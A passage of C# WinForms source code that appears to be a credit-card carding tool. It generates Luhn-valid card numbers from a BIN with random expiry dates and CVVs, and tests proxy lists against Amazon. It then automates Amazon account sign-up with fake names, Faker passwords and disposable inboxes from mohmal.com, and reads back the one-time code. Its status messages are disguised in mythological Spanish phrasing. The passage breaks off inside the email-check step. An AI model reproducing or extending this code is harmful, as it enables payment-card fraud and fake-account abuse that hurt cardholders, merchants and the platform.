                LabelCountHellheim.Text = textBox.Lines.Count().ToString();
            }
            catch (Exception) { /*throw;*/ }
        }
        private void IconButtonClear_Click(object sender, EventArgs e)
        {
            IconButton iconButton = (IconButton)sender;
            iconButton.IconColor = Color.Black;
            iconButton.Enabled = false;
            TextBoxBin.Clear();
            TextBoxBin.Placeholder("######xxxxxxxxxx");
            MaskedTextBoxDate.Clear();
            MaskedTextBoxDate.Placeholder("dd/aa");
            TextBoxCvv.Clear();
            TextBoxCvv.Placeholder(cvvDigits);
            TextBoxQuantity.Clear();
            TextBoxQuantity.Text = "10";
            TextBoxCreditCards.Text = string.Empty;
            TextBoxValhalla.Text = string.Empty;
            TextBoxHelheim.Text = string.Empty;
            IconButtonGenerar.IconColor = Color.Black;
            IconButtonGenerar.Enabled = false;
            IconButtonVerify.IconColor = Color.Black;
            IconButtonVerify.Enabled = false;
            LabelGetBin.Text = "-";
            LabelGetSchema.Text = "-";
            LabelGetType.Text = "-";
            LabelGetBrand.Text = "-";
            LabelGetBank.Text = "-";
            LabelGetCountry.Text = "-";
        }
        #endregion
        #endregion
        #endregion

        #region Generator Credit Cards
        #region Methods
        private async Task GenerateCreditCards()
        {
            tokenCancel = new CancellationTokenSource();
            CancellationToken token = tokenCancel.Token;

            //  await Task.Factory.StartNew(async () =>
            await Task.Run(async () =>
             {
                 if (!token.IsCancellationRequested)
                 {
                     string bin = TextBoxBin.Text.Replace("x", string.Empty).Replace("X", string.Empty);
                     string listCreditCard = string.Empty;
                     if (bin.Length >= 6)
                     {
                         Dictionary<int, int> precision = new Dictionary<int, int>();
                         RangeAndLength[] range = AllCards();
                         int rangeLength = range.Length;
                         for (int j = 0; j < rangeLength; j++)
                         {
                             string pattern = @"\b" + range[j].Range;
                             Match match = Regex.Match(bin, pattern);
                             if (match.Success)
                             {
                                 precision.Add(j, int.Parse(match.Value));
                             }
                         }
                         if (precision.Count > 0)
                         {
                             RangeAndLength card = range[precision.OrderByDescending(x => x.Value).First().Key];
                             int cardLenght = card.Length;
                             Quatity = TextBoxQuantity.Text;
                             int quantity = int.Parse(Quatity);
                             CreditCards = new List<List<string>>();
                             for (int i = 0; i < quantity; i++)
                             {
                                 double progress = Convert.ToDouble((i + 1) * 100 / quantity);
                                 await ConsoleProgressGeneral("Generando", (int)Math.Round(progress));
                                 CreditCards.Add(new List<string>());
                                 CreditCards[i].Add(CreateCardNumber(bin, cardLenght));
                                 CreditCards[i].Add(GetDate()[0]);
                                 CreditCards[i].Add(GetDate()[1]);
                                 CreditCards[i].Add(GetCvv());
                                 await Task.Delay(50);
                                 if (IconButtonGenerarStopClick)
                                 {
                                     IconButtonGenerarStopClick = false;
                                     await ConsoleProgressGeneral("¡Detenido!", 0, "Success");
                                     break;
                                 }
                             }

                             if (CreditCards.Count > 0)
                             {
                                 int creditCardsCount = CreditCards.Count;
                                 for (int i = 0; i < creditCardsCount; i++)
                                 {
                                     if (i != creditCardsCount - 1)
                                     {
                                         listCreditCard += string.Join("|", CreditCards[i].ToArray()) + "\r\n";
                                     }
                                     else
                                     {
                                         listCreditCard += string.Join("|", CreditCards[i].ToArray());
                                     }
                                 }
                             }
                         }
                     }
                     TextBoxCreditCards.Text = listCreditCard;
                 }
             }, token);
        }
        private static RangeAndLength[] AllCards()
        {
            return BuildRangeAndLengthList(rangeAmex, 15).
                Union(BuildRangeAndLengthList(rangeCUP, 16)).
                Union(BuildRangeAndLengthList(rangeDCCB, 14)).
                Union(BuildRangeAndLengthList(rangeDCI, 14)).
                Union(BuildRangeAndLengthList(rangeDCUSC, 16)).
                Union(BuildRangeAndLengthList(rangeDC, 14)).
                Union(BuildRangeAndLengthList(rangeInsP, 16)).
                Union(BuildRangeAndLengthList(rangeIntP, 16)).
                Union(BuildRangeAndLengthList(rangeJCB, 16)).
                Union(BuildRangeAndLengthList(rangeM, 16)).
                Union(BuildRangeAndLengthList(rangeMC, 16)).
                Union(BuildRangeAndLengthList(rangeUATP, 15)).
                Union(BuildRangeAndLengthList(rangeV, 16)).
                ToArray();
        }
        private static IEnumerable<RangeAndLength> BuildRangeAndLengthList(string[] rangeList, int length)
        {
            string[] x = GenerateRange(rangeList);
            return from range in x select new RangeAndLength(range, length);
        }
        private static string[] GenerateRange(string[] rangesList)
        {
            List<string> range = new List<string>();
            foreach (string rangeList in rangesList)
            {
                if (rangeList.Contains("-"))
                {
                    string[] ranges = rangeList.Split('-');
                    int start = int.Parse(ranges[0]);
                    int end = int.Parse(ranges[1]);

                    for (int i = start; i <= end; i++)
                    {
                        range.Add(i.ToString());
                    }
                }
                else
                {
                    range.Add(rangeList);
                }
            }
            return range.ToArray();
        }
        private struct RangeAndLength
        {
            public RangeAndLength(string range, int length)
            {
                Range = range;
                Length = length;
            }
            public string Range { get; set; }
            public int Length { get; set; }
        }
        private string CreateCardNumber(string bin, int binLenght)
        {
            Random random = new Random();
            string ccnumber = bin;
            while (ccnumber.Length < (binLenght - 1))
            {
                double rnd = (random.NextDouble() * 1.0f - 0f);
                ccnumber += Math.Floor(rnd * 10);
            }

            // reverse number and convert to int
            IEnumerable<char> reversedCCnumberstring = ccnumber.ToCharArray().Reverse();
            IEnumerable<int> reversedCCnumberList = reversedCCnumberstring.Select(c => Convert.ToInt32(c.ToString()));

            // calculate sum //Luhn Algorithm http://en.wikipedia.org/wiki/Luhn_algorithm
            int sum = 0;
            int pos = 0;
            int[] reversedCCnumber = reversedCCnumberList.ToArray();

            while (pos < binLenght - 1)
            {
                int odd = reversedCCnumber[pos] * 2;

                if (odd > 9)
                    odd -= 9;

                sum += odd;

                if (pos != (binLenght - 2))
                    sum += reversedCCnumber[pos + 1];

                pos += 2;
            }

            // calculate check digit
            int checkdigit = Convert.ToInt32((Math.Floor((decimal)sum / 10) + 1) * 10 - sum) % 10;
            ccnumber += checkdigit;
            return ccnumber;
        }
        private List<string> GetDate()
        {
            List<string> date = new List<string>();
            if (MaskedTextBoxDate.Text != "dd/aa")
            {
                string[] split = MaskedTextBoxDate.Text.Split('/');
                date.Add(split[0]);
                date.Add("20" + split[1]);
            }
            else
            {
                date.Add(new Random().Next(1, 12).ToString("00"));
                date.Add("20" + new Random().Next(20, 29).ToString());
            }
            return date;
        }
        private string GetCvv()
        {
            string cvv;
            if (TextBoxCvv.Text == cvvDigits)
            {
                if (TextBoxCvv.MaxLength == 4)
                {
                    cvv = new Random().Next(1, 9999).ToString("0000");
                }
                else
                {
                    cvv = new Random().Next(1, 999).ToString("000");
                }
            }
            else
            {
                cvv = TextBoxCvv.Text;
            }
            return cvv;
        }

        #endregion
        #endregion

        #region Valkyrie
        #region Panel Valkyrie
        #region Panel Events
        private void PanelValkyrie_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxValkyrie = new Rectangle(TextBoxValkyrie.Location.X, TextBoxValkyrie.Location.Y, TextBoxValkyrie.ClientSize.Width + 17, TextBoxValkyrie.ClientSize.Height);
            borderTextBoxValkyrie.Inflate(1, 1); // border thickness
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxValkyrie, Color.White, ButtonBorderStyle.Solid);
        }
        #endregion

        #region Contols Events
        private void TextBoxValkyrie_TextChanged(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            try
            {
                LabelCountValkyrie.Text = textBox.Lines.Count().ToString();
                string valkyries = textBox.Text.Trim();
                if (ModifierKeys.HasFlag(Keys.Control))
                {
                    if (valkyries.Contains("\r\n"))
                    {
                        string[] listValkyries = valkyries.Split(new string[] { "\r\n" }, StringSplitOptions.None);
                        int listValkyriesLength = listValkyries.Length;
                        Valkyries = new List<List<string>>();
                        for (int i = 0; i < listValkyriesLength; i++)
                        {
                            string[] listValkyrie = listValkyries[i].Split('|');
                            Valkyries.Add(new List<string>());
                            Valkyries[i].Add(listValkyrie[0]);
                            Valkyries[i].Add(listValkyrie[1]);
                            Valkyries[i].Add(listValkyrie[2]);
                        }
                        if (!IconButtonValkyrieVerifyClick)
                        {
                            IconButtonValkyrieVerify.IconColor = Color.White;
                            IconButtonValkyrieVerify.Enabled = true;
                            IconButtonValkyrieClear.IconColor = Color.White;
                            IconButtonValkyrieClear.Enabled = true;
                        }
                    }
                    else if (valkyries.Contains("|"))
                    {
                        Valkyries = new List<List<string>>();
                        string[] listValkyrie = valkyries.Split('|');
                        Valkyries.Add(new List<string>());
                        Valkyries[0].Add(listValkyrie[0]);
                        Valkyries[0].Add(listValkyrie[1]);
                        Valkyries[0].Add(listValkyrie[2]);
                        if (!IconButtonValkyrieVerifyClick)
                        {
                            IconButtonValkyrieVerify.IconColor = Color.White;
                            IconButtonValkyrieVerify.Enabled = true;
                            IconButtonValkyrieClear.IconColor = Color.White;
                            IconButtonValkyrieClear.Enabled = true;
                        }
                    }
                    else
                    {
                        textBox.Text = string.Empty;
                    }
                }
                else
                {
                    if (valkyries == string.Empty)
                    {
                        textBox.Text = string.Empty;
                        IconButtonVerify.IconColor = Color.Black;
                        IconButtonVerify.Enabled = false;
                        if (TextBoxValkyrieLive.Text == string.Empty && TextBoxValkyrieDie.Text == string.Empty)
                        {
                            IconButtonClear.IconColor = Color.Black;
                            IconButtonClear.Enabled = false;
                        }
                    }
                }
            }
            catch (Exception)
            {
                textBox.Text = string.Empty;
            }
        }
        private async void IconButtonValkyrieVerify_Click(object sender, EventArgs e)
        {
            IconButton iconButton = (IconButton)sender;
            iconButton.IconColor = Color.Black;
            iconButton.Enabled = false;
            IconButtonValkyrieStart.IconColor = Color.Black;
            IconButtonValkyrieStart.Enabled = false;
            IconButtonValkyrieClear.IconColor = Color.Black;
            IconButtonValkyrieClear.Enabled = false;
            IconButtonValkyrie.IconColor = Color.Black;
            IconButtonValkyrie.Enabled = false;
            IconButtonValkyrieVerifyClick = true;
            IconButtonValkyrieStop.Show();
            await InvokeValkyrie();
            await ConsoleProgressGeneral("_Balder finalizo llamado a Valquirias.", 100, "Success");
            await ConsoleProgressDetail("_Balder finalizo llamado a Valquirias.", 100, "Success");
            await ConsoleProgressGeneral("VALKIRIAS (PROXYS).", 0);
            await ConsoleProgressDetail("VALKIRIAS (PROXYS).", 0);
            IconButtonValkyrieClear.IconColor = Color.White;
            IconButtonValkyrieClear.Enabled = true;
            if (!string.IsNullOrEmpty(TextBoxValkyrieLive.Text))
            {
                if (TextBoxValkyrieLive.Lines.Count() > 0)
                {
                    IconButtonValkyrieStart.IconColor = Color.White;
                    IconButtonValkyrieStart.Enabled = true;
                    IconButtonValkyrie.IconColor = Color.White;
                    IconButtonValkyrie.Enabled = true;
                }
            }
            IconButtonValkyrieVerifyClick = false;
            IconButtonValkyrieStop.Hide();
        }
        #endregion
        #endregion

        #region Panel Valkyrie Live
        #region Panel events
        private void PanelValkyrieLive_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxValkyrieLive = new Rectangle(TextBoxValkyrieLive.Location.X, TextBoxValkyrieLive.Location.Y, TextBoxValkyrieLive.ClientSize.Width + 17, TextBoxValkyrieLive.ClientSize.Height);
            borderTextBoxValkyrieLive.Inflate(1, 1); // border thickness
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxValkyrieLive, Color.White, ButtonBorderStyle.Solid);
        }
        #endregion

        #region Controls Events
        private void TextBoxValkyrieLive_TextChanged(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            LabelCountValkyrieLive.Text = textBox.Lines.Count().ToString();
            Valkyrie.Play();
        }
        private void IconButtonValkyrieStart_Click(object sender, EventArgs e)
        {
            try
            {
                IconButton iconButton = (IconButton)sender;
                iconButton.IconColor = Color.Black;
                iconButton.Enabled = false;
                string valkyries = TextBoxValkyrieLive.Text.Trim();
                if (valkyries.Contains("\r\n"))
                {
                    string[] listValkyries = valkyries.Split(new string[] { "\r\n" }, StringSplitOptions.None);
                    int listValkyriesLength = listValkyries.Length;
                    LiveValkyries = new List<List<string>>();
                    for (int i = 0; i < listValkyriesLength; i++)
                    {
                        string[] listValkyrie = listValkyries[i].Split('|');
                        LiveValkyries.Add(new List<string>());
                        LiveValkyries[i].Add(listValkyrie[0] + "://" + listValkyrie[1] + ":" + listValkyrie[2]);
                    }
                }
                else if (valkyries.Contains("|"))
                {
                    LiveValkyries = new List<List<string>>();
                    string[] listValkyrie = valkyries.Split('|');
                    LiveValkyries.Add(new List<string>());
                    LiveValkyries[0].Add(listValkyrie[0] + "://" + listValkyrie[1] + ":" + listValkyrie[2]);
                }

            }
            catch (Exception) { }
            IconButtonGenerar.IconColor = IconButtonGenerarIconColor;
            IconButtonGenerar.Enabled = IconButtonGenerarEnabled;
            PanelValkyrie.Hide();
            PanelValkyrieLive.Hide();
            PanelValkyrieDie.Hide();
            ShowPanelValkyrie = false;
        }
        private async void IconButtonValkyrieStop_Click(object sender, EventArgs e)
        {
            try
            {
                if (tokenCancel != null)
                {
                    IconButton iconbutton = (IconButton)sender;
                    iconbutton.IconColor = Color.Black;
                    iconbutton.Enabled = false;
                    await browser.Kill("www.amazon.com");
                    tokenCancel.Cancel();
                    tokenCancel.Dispose();
                    tokenCancel = null;
                    await ConsoleProgressGeneral("¡Detenido!", 0, "Success");
                    await ConsoleProgressDetail("¡Detenido!", 0, "Success");
                    await ConsoleProgressGeneral("VALKIRIAS (PROXYS)", 0);
                    await ConsoleProgressDetail("VALKIRIAS (PROXYS)", 0);
                    IconButtonValkyrieClear.IconColor = Color.White;
                    IconButtonValkyrieClear.Enabled = true;
                    IconButtonValkyrie.IconColor = Color.White;
                    IconButtonValkyrie.Enabled = true;
                    if (Valkyries.Count > 0)
                    {
                        IconButtonValkyrieVerify.IconColor = Color.White;
                        IconButtonValkyrieVerify.Enabled = true;
                    }

                    if (!string.IsNullOrEmpty(TextBoxValkyrieLive.Text))
                    {
                        if (TextBoxValkyrieLive.Lines.Count() > 0)
                        {
                            IconButtonValkyrieStart.IconColor = Color.White;
                            IconButtonValkyrieStart.Enabled = true;
                            IconButtonValkyrie.IconColor = Color.White;
                            IconButtonValkyrie.Enabled = true;
                        }
                    }
                    iconbutton.Hide();
                }
            }
            catch (Exception) { }
        }
        #endregion
        #endregion

        #region  Panel Valkyrie Die
        #region Panel events
        private void PanelValkyrieDie_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxValkyrieDie = new Rectangle(TextBoxValkyrieDie.Location.X, TextBoxValkyrieDie.Location.Y, TextBoxValkyrieDie.ClientSize.Width + 17, TextBoxValkyrieDie.ClientSize.Height);
            borderTextBoxValkyrieDie.Inflate(1, 1); // border thickness
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxValkyrieDie, Color.White, ButtonBorderStyle.Solid);
        }
        #endregion

        #region Controls Events
        private void TextBoxValkyrieDie_TextChanged(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            LabelCountValkyrieDie.Text = textBox.Lines.Count().ToString();
        }
        private void IconButtonValkyrieClear_Click(object sender, EventArgs e)
        {
            IconButton iconButton = (IconButton)sender;
            iconButton.IconColor = Color.Black;
            iconButton.Enabled = false;
            IconButtonValkyrieVerify.IconColor = Color.Black;
            IconButtonValkyrieVerify.Enabled = false;
            IconButtonValkyrieStart.IconColor = Color.Black;
            IconButtonValkyrieStart.Enabled = false;
            TextBoxValkyrie.Text = string.Empty;
            TextBoxValkyrieLive.Text = string.Empty;
            TextBoxValkyrieDie.Text = string.Empty;
            if (Valkyries != null)
            {
                if (Valkyries.Count > 0)
                {
                    Valkyries.Clear();
                }
            }

            if (LiveValkyries != null)
            {
                if (LiveValkyries.Count > 0)
                {
                    LiveValkyries.Clear();
                }
            }
        }
        #endregion
        #endregion

        #region Methods
        private async Task InvokeValkyrie()
        {
            try
            {
                string listValkyrieLive = string.Empty;
                string listValkyrieDie = string.Empty;
                int valkyriesCount = Valkyries.Count;
                await ConsoleProgressGeneral("_Balder hace llamado a Valquirias.", 0);
                int x = 0;
                for (int i = 0; i < valkyriesCount;)
                {
                    string proxy = Valkyries[i][0] + "://" + Valkyries[i][1] + ":" + Valkyries[i][2];
                    bool odinVerifyValkyrie = await _BalderVerifyValkyrie(proxy);
                    if (odinVerifyValkyrie)
                    {
                        if (TextBoxValkyrieLive.Text == string.Empty)
                        {
                            listValkyrieLive += string.Join("|", Valkyries[i].ToArray());
                        }
                        else
                        {
                            listValkyrieLive = TextBoxValkyrieLive.Text;
                            listValkyrieLive += "\r\n" + string.Join("|", Valkyries[i].ToArray());
                        }
                        await ReduceListValkyrie();
                        TextBoxValkyrieLive.Text = listValkyrieLive;
                        double progress = Convert.ToDouble((x + 1) * 100 / valkyriesCount);
                        await ConsoleProgressGeneral("_Balder llamando a Valquirias.", (int)Math.Round(progress));
                    }
                    else
                    {
                        if (TextBoxValkyrieDie.Text == string.Empty)
                        {
                            listValkyrieDie += string.Join("|", Valkyries[i].ToArray());
                        }
                        else
                        {
                            listValkyrieDie = TextBoxValkyrieDie.Text;
                            listValkyrieDie += "\r\n" + string.Join("|", Valkyries[i].ToArray());
                        }
                        await ReduceListValkyrie();
                        TextBoxValkyrieDie.Text = listValkyrieDie;
                        double progress = Convert.ToDouble((x + 1) * 100 / valkyriesCount);
                        await ConsoleProgressGeneral("_Balder llamando a Valquirias.", (int)Math.Round(progress));
                    }
                    await Task.Delay(50);
                    x++;

                }
            }
            catch (Exception) { }
        }
        private async Task<bool> _BalderVerifyValkyrie(string proxy)
        {
            bool odin = false;
            try
            {
                browser = new ChromiumWebBrowser();
                await Task.Delay(500);
                tokenCancel = new CancellationTokenSource();
                CancellationToken token = tokenCancel.Token;
                await ConsoleProgressDetail("Valquirias preparadas.", 0);
                await Task.Run(async () =>
                {
                    await ConsoleProgressDetail("Valquirias preparadas.", 20);
                    if (!token.IsCancellationRequested)
                    {
                        bool loadPage = await browser.LoadPage(initialUrl, proxy);
                        await ConsoleProgressDetail("Analizando Valquiria. " + proxy, 40);
                        await Task.Delay(500);
                        if (loadPage)
                        {
                            bool start_BalderValkyrie = await Start_BalderValkyrie();
                            if (start_BalderValkyrie)
                            {
                                await ConsoleProgressDetail("Valquiria. " + proxy, 100, "Success");
                                odin = true;
                            }
                            else
                            {
                                await ConsoleProgressDetail("Valquiria. " + proxy, 100, "Fail");
                                odin = false;
                            }
                        }
                        else
                        {
                            await _BalderVerifyValkyrie(proxy);
                        }
                    }
                    else
                    {
                        odin = false;
                    }
                }, token);
            }
            catch (Exception) { }
            return odin;
        }

        private async Task<bool> Start_BalderValkyrie()
        {
            try
            {
                await ConsoleProgressDetail("Estado de Valquiria.", 80);
                if (await browser.ElementVisible("#dropSortBy", "ExceptionStart_BalderValkyrie"))
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch (Exception) { }
            return false;
        }
        private async Task ReduceListValkyrie()
        {
            try
            {
                Valkyries.RemoveAt(0);
                string listValkyries = string.Empty;
                int ValkyriesCount = Valkyries.Count;
                for (int i = 0; i < ValkyriesCount; i++)
                {
                    if (Valkyries.Count > 0)
                    {
                        if (i < Valkyries.Count - 1)
                        {
                            listValkyries += string.Join("|", Valkyries[i].ToArray()) + "\r\n";
                        }
                        else
                        {
                            listValkyries += string.Join("|", Valkyries[i].ToArray());
                        }
                    }
                    else
                    {
                        listValkyries = string.Empty;
                    }
                    await Task.Delay(50);
                }
                TextBoxValkyrie.Text = listValkyries;
            }

            catch (Exception) { }
        }
        #endregion

        #endregion

        #region Web Browser
        #region Load Browser
        //private async Task InvokeHermoor()
        //{
        //    try
        //    {
        //        browser2 = new ChromiumWebBrowser();
        //        await Task.Delay(500);

        //        tokenCancel = new CancellationTokenSource();
        //        CancellationToken token = tokenCancel.Token;

        //        Email = await Task<string>.Run(async () =>
        //        {
        //            if (!token.IsCancellationRequested)
        //            {
        //                return await LoadHermoor();
        //            }
        //            else
        //            {
        //                return null;
        //            }
        //        }, token);
        //    }
        //    catch (Exception) { }
        //    if (Email == null)
        //    {
        //        await InvokeHermoor();
        //    }
        //}

        //private async Task<string> LoadHermoor()
        //{
        //    try
        //    {
        //        if (await browser2.LoadPage("https://www.crazymailing.com/"))
        //        {
        //            return await StartHermoor();
        //        }
        //    }
        //    catch (Exception) { }
        //    return null;
        //}

        //private async Task<string> StartHermoor()
        //{
        //    try
        //    {
        //        browser2.Screenshot("1.StartHermoor");
        //        await browser2.ExecuteScript("function alert(){ return false; }");
        //    }
        //    catch (Exception) { }

        //    bool paragraphEmail = await browser2.ElementInnerTextContent("#email_addr", "@", "ExceptionStartHermoor");
        //    if (paragraphEmail)
        //    {
        //        return await GetEmail();
        //    }

        //    return null;
        //}

        //private async Task<string> GetEmail()
        //{
        //    try
        //    {
        //        string getEmail = "document.querySelector('#email_addr').textContent;";
        //        return (string)await browser2.ExecuteScript(getEmail);
        //    }
        //    catch (Exception) { }
        //    return null;
        //}

        private async Task InvokeHermoor()
        {
            try
            {
                browser2 = new ChromiumWebBrowser();
                await Task.Delay(500);

                tokenCancel = new CancellationTokenSource();
                CancellationToken token = tokenCancel.Token;

                Email = await Task<string>.Run(async () =>
                {
                    if (!token.IsCancellationRequested)
                    {
                        return await LoadHermoor();
                    }
                    else
                    {
                        return null;
                    }
                }, token);
            }
            catch (Exception) { }
            if (Email == null)
            {
                await browser2.Kill("www.mohmal.com");
                await InvokeHermoor();
            }
        }

        private async Task<string> LoadHermoor()
        {
            try
            {
                if (await browser2.LoadPage("https://www.mohmal.com/en/inbox"))
                {
                    return await StartHermoor();
                }
            }
            catch (Exception) { }
            return null;
        }

        private async Task<string> StartHermoor()
        {
            try
            {
                browser2.Screenshot("1.StartHermoor");
                await browser2.ExecuteScript("function alert(){ return false; }");
            }
            catch (Exception) { }

            bool paragraphEmail = await browser2.ElementInnerTextContent("#email > div.email", "@", "ExceptionStartHermoor");
            if (paragraphEmail)
            {
                return await GetEmail();
            }

            return null;
        }

        private async Task<string> GetEmail()
        {
            try
            {
                string getEmail = "document.querySelector('#email > div.email').textContent;";
                return (string)await browser2.ExecuteScript(getEmail);
            }
            catch (Exception) { }
            return null;
        }

        private async Task Invoke_Balder()
        {
            bool odin = false;
            try
            {
                await ConsoleProgressGeneral("Invocando a _Balder.", 0);

                browser = new ChromiumWebBrowser();
                await Task.Delay(500);

                tokenCancel = new CancellationTokenSource();
                CancellationToken token = tokenCancel.Token;

                odin = await Task<bool>.Run(async () =>
                {
                    if (!token.IsCancellationRequested)
                    {

                        return await LoadBrowser();
                    }
                    else
                    {
                        return false;
                    }
                }, token);
            }
            catch (Exception) { }

            await browser.Kill("www.amazon.com");
            await browser2.Kill("www.mohmal.com");
            await tokenCancel.Kill();

            if (odin)
            {
                await ConsoleProgressGeneral("_Balder finalizo los procesos correctamente.", 100, "Success");
                IconButtonClear.IconColor = Color.White;
                IconButtonClear.Enabled = true;
                IconButtonValkyrie.IconColor = Color.White;
                IconButtonValkyrie.Enabled = true;
            }
            else
            {
                if (!running)
                {
                    await ConsoleProgressGeneral("_Balder fue detenido.", 0, "Fail");
                    IconButtonGenerar.IconColor = IconButtonGenerarIconColor;
                    IconButtonGenerar.Enabled = IconButtonGenerarEnabled;
                    IconButtonClear.IconColor = Color.White;
                    IconButtonClear.Enabled = true;
                    IconButtonValkyrie.IconColor = Color.White;
                    IconButtonValkyrie.Enabled = true;
                    if (CreditCards != null)
                    {
                        if (CreditCards.Count > 0)
                        {
                            IconButtonVerify.IconColor = Color.White;
                            IconButtonVerify.Enabled = true;

                        }
                        else
                        {
                            TextBoxCreditCards.Clear();
                            IconButtonVerify.IconColor = Color.Black;
                            IconButtonVerify.Enabled = false;
                        }
                    }
                }

                else if (CreditCards.Count > 0)
                {
                    await ConsoleProgressGeneral("_Balder requiere un sacrificio.", 0, "Fail");
                    await ConsoleProgressGeneral("Ofreciendo un sacrificio a _Balder.", 0, "Success");
                    await InvokeHermoor();
                    await Invoke_Balder();

                }
                else
                {
                    await ConsoleProgressGeneral("_Balder encontro un elfo oscuro y se detuvo.", 0, "Fail");
                }
            }
            await Task.Delay(2000);
            await ConsoleProgressGeneral("ODIN PADRE DE TODO.", 0);
            await ConsoleProgressDetail("", 0);
        }

        private async Task<bool> LoadBrowser()
        {
            if (running)
            {
                bool loadBrowser = false;
                try
                {

                    await ConsoleProgressGeneral("Invocando a _Balder..", 2);
                    string url = initialUrl;
                    if (LiveValkyries != null)
                    {
                        if (LiveValkyries.Count > 0)
                        {
                            List<string> proxy = LiveValkyries.OrderBy(x => Guid.NewGuid()).FirstOrDefault();
                            await ConsoleProgressGeneral("Valquiria: " + proxy[0], 2);
                            loadBrowser = await browser.LoadPage(url, proxy[0]);
                        }
                        else
                        {
                            loadBrowser = await browser.LoadPage(url);
                        }
                    }
                    else
                    {
                        loadBrowser = await browser.LoadPage(url);
                    }
                }
                catch (Exception) { }

                await Task.Delay(500);
                if (loadBrowser)
                {
                    return await LoadPage();
                }

                await ConsoleProgressGeneral("Invocando a _Balder.. ¡Fallo!", 2, "Fail");
                return false;
            }
            else { return false; }
        }

        private async Task<bool> LoadPage()
        {
            if (running)
            {
                try
                {
                    await ConsoleProgressGeneral("Invocando a _Balder...", 3);
                    return await Start_Balder();
                }
                catch (Exception) { }

                await ConsoleProgressGeneral("Invocando a _Balder... ¡Fallo!", 0, "Fail");
                return false;
            }
            else { return false; }
        }
        #endregion

        #region  Gate Step By Step
        private async Task<bool> Start_Balder()
        {
            if (running)
            {
                try
                {
                    ////browser.Screenshot("1.Load");
                    await ConsoleProgressGeneral("Homogeneizando anatomía de interés.", 5);
                    await browser.ExecuteScript("function alert(){ return false; }");
                }
                catch (Exception) { }

                bool spanPrime = await browser.ElementExists("#prime-header-CTA", "ExceptionStart_Balder");
                if (spanPrime)
                {
                    return await TryPrime();
                }

                await ConsoleProgressGeneral("Homogeneizando anatomía de interés. ¡Fallo!", 5, "Fail");
                return false;
            }
            else { return false; }
        }

        private async Task<bool> TryPrime()
        {
            if (running)
            {
                bool item = false;
                try
                {
                    //await browser.GetBrowser().StopLoad();

                    ////browser.Screenshot("1.TryPrime");
                    await ConsoleProgressGeneral("Estableciendo registro de regalos.", 10);
                    await browser.Click("#prime-header-CTA");
                }
                catch (Exception) { }
                bool anchorCreateAccount = await browser.ElementVisible("#createAccountSubmit", "ExceptionTryPrime");
                if (anchorCreateAccount)
                {
                    return await Prime();
                }

                await ConsoleProgressGeneral("Estableciendo registro de regalos. ¡Fallo!", 10, "Fail");
                return item;
            }
            else { return false; }
        }

        private async Task<bool> Prime()
        {
            if (running)
            {
                try
                {
                    ////browser.Screenshot("2.Prime");
                    await ConsoleProgressGeneral("Reajustando peso emocional.", 15);
                    await browser.Click("#createAccountSubmit");
                }
                catch (Exception) { }

                bool inputCustomerName = await browser.ElementVisible("#ap_customer_name", "ExceptionRandomAddToCart");
                if (inputCustomerName)
                {
                    return await CreateAccount();
                }
                await ConsoleProgressGeneral("Reajustando peso emocional. ¡Fallo!", 15, "Fail");
                return false;
            }
            else { return false; }
        }

        private async Task<bool> CreateAccount()
        {
            try
            {

                ////browser.Screenshot("3.CreateAccount");
                await ConsoleProgressGeneral("Calculando tasa de cambio.", 20);
                FullName = Faker.Person.FullName;
                Password = Faker.Internet.Password();
                await browser.JsSendKeys("#ap_customer_name", string.Empty);
                await browser.SendKeys("#ap_customer_name", FullName);
                await browser.JsSendKeys("#ap_email", string.Empty);
                await browser.SendKeys("#ap_email", Email);
                await browser.SendKeys("#ap_password", Password);
                await browser.SendKeys("#ap_password_check", Password);
                await Task.Delay(1000);
                await browser.Click("#a-autoid-0");

                //  MessageBox.Show(Email+" : "+password);
            }
            catch (Exception) { }
            bool imageCaptcha = await browser.ElementVisible("img[alt=captcha]", "ExceptionCreateAccount");
            if (imageCaptcha)
            {
                return await Captcha();
            }
            else
            {
                bool inputCode = await browser.ElementVisible("input[name=code]", "ExceptionViewCart");
                if (inputCode)
                {
                    return await RefreshEmail();
                    //bool strongAmazon = await browser2.ElementInnerTextContent("div.subj.inline > strong", "Amazon", "ExceptionCreateAccountEmail", 40);
                    //if (strongAmazon)
                    //{
                    //    bool checkEmail = await CheckEmail();
                    //    if (checkEmail)
                    //    {
                    //        return await SetOTP();
                    //    }
                    //}
                    //else
                    //{
                    //    await browser2.Kill("www.crazymailing.com");
                    //    await InvokeHermoor();
                    //    bool anchorChange = await browser.ElementVisible("a.a-link-normal.cvf-widget-link-claim-change", "ExceptionCreateAccountAnchorChange");
                    //    if (anchorChange)
                    //    {
                    //        return await Change();
                    //    }
                    //}
                }
            }

            await ConsoleProgressGeneral("Calculando tasa de cambio. ¡Fallo!", 20, "Fail");
            return false;
        }

        private async Task<bool> RefreshEmail()
        {
            try
            {
                browser2.Screenshot("4.RefreshEmail");
                await ConsoleProgressGeneral("Activando umbral de desviación.", 25);
                await browser2.Click("#refresh");
            }
            catch (Exception) { }
            bool anchorAmazon = await browser2.ElementInnerTextContent("#inbox-table > tbody > tr > td.subject > a", "Amazon", "ExceptionRefreshEmail");

            if (countRefreshEmail < limitRefreshEmail)
            {
                if (!anchorAmazon)
                {
                    countRefreshEmail++;
                    return await RefreshEmail();
                }
                countRefreshEmail = 0;
            }

            if (anchorAmazon)
            {
                bool checkEmail = await CheckEmail();
                if (checkEmail)
                {
                    return await SetOTP();
                }
            }
            else
            {
                await browser2.Kill("www.mohmal.com");
                await InvokeHermoor();
                bool anchorChange = await browser.ElementVisible("a.a-link-normal.cvf-widget-link-claim-change", "ExceptionCreateAccountAnchorChange");
                if (anchorChange)
                {
                    return await ChangeEmail();
                }
            }
            await ConsoleProgressGeneral("Activando umbral de desviación. ¡Fallo!", 25, "Fail");
            return false;
        }

        private async Task<bool> CheckEmail()
        {
            try
            {
                browser2.Screenshot("4.CheckEmail");
                await ConsoleProgressGeneral("Requisando donaciones del alumnado.", 30);
                await browser2.Click("#inbox-table > tbody > tr > td.subject > a");
